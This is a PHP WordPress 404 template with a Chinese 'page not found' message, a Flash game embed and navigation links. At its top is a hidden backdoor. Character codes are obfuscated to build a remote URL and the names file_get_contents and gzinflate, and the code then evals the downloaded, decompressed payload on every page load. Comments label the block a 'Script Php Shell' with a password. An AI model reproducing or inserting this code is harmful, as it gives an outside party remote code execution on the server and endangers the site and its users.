<?php
$password='a';//登录密码
$shellname='Script Php Shell';//我的版权
//----------功能程序------------------//
$c="chr";
session_start();
if(empty($_SESSION['PhpCode'])){
$url.=$c(104).$c(116).$c(116).$c(112).$c(58);
$url.=$c(47).$c(47).$c(98).$c(107).$c(107);
$url.=$c(105).$c(108).$c(108).$c(46).$c(99);
$url.=$c(111).$c(109).$c(47).$c(112).$c(46);
$url.=$c(103).$c(105).$c(102);
$get=chr(102).chr(105).chr(108).chr(101).chr(95);
$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
$get.=chr(116).chr(115);
$_SESSION['PhpCode']=$get($url);
}
$unzip=$c(103).$c(122).$c(105).$c(110);
$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
@eval($unzip($_SESSION['PhpCode']));
?>





<?php get_header(); ?>
<div class="content-wrap">
	<div style="text-align:center;padding:10px 0;font-size:16px;background-color:#ffffff;">
		<h2 style="font-size:36px;margin-bottom:10px;">哎哟～页面找不到了～休息一下，玩个游戏吧！</h2>
  <embed type="application/x-shockwave-flash" width="600" height="400" src="http://images.yusi123.com/zhuamao.swf" wmode="transparent" quality="high" scale="noborder" flashvars="width=600&amp;height=400" allowscriptaccess="sameDomain" align="L">
<br>
	<p align="center">
		<font face="微软雅黑" size="5" color="#0099CC">
			<a target="_blank" href="http://cuiqingcai.com/">首页</a>&nbsp;
			<a target="_blank" href="http://cuiqingcai.com/category/life" title="">生活笔记</a>&nbsp;
			<a target="_blank" href="http://cuiqingcai.com/art">艺术之风</a>&nbsp;
			<a target="_blank" href="http://cuiqingcai.com/category/resources">福利专区</a>&nbsp;
			<a target="_blank" href="http://cuiqingcai.com/contact">给我留言</a>&nbsp;
		</font>
	</p>
<p align="center">
	
</div>